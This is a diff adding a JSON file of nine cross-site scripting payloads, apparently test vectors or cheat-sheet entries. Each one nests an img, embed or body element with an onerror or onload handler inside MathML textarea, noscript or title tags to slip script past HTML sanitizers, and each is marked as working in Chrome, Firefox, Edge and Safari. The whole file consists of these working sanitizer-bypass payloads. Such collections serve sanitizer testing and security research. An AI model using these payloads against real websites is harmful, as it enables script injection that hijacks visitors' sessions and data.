@@ -1,0 +1,47 @@
+[
+  {
+    "description": "Math textarea and image",
+    "code": "<math><textarea><img src onerror=alert(1)></textarea></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math textarea and embed",
+    "code": "<math><textarea><embed src=1 onerror=alert(1) type=image/gif></textarea></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math textarea and body",
+    "code": "<math><textarea><body onload=alert(1)></textarea></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math noscript and image",
+    "code": "<math><noscript><img src onerror=alert(1)></noscript></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math noscript and embed",
+    "code": "<math><noscript><embed src=1 onerror=alert(1) type=image/gif></noscript></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math noscript and body",
+    "code": "<math><noscript><body onload=alert(1)></noscript></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math title and image",
+    "code": "<math><title><img src onerror=alert(1)></title></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math title and embed",
+    "code": "<math><title><embed src=1 onerror=alert(1) type=image/gif></title></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math title and body",
+    "code": "<math><title><body onload=alert(1)></title></math>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  }
+]
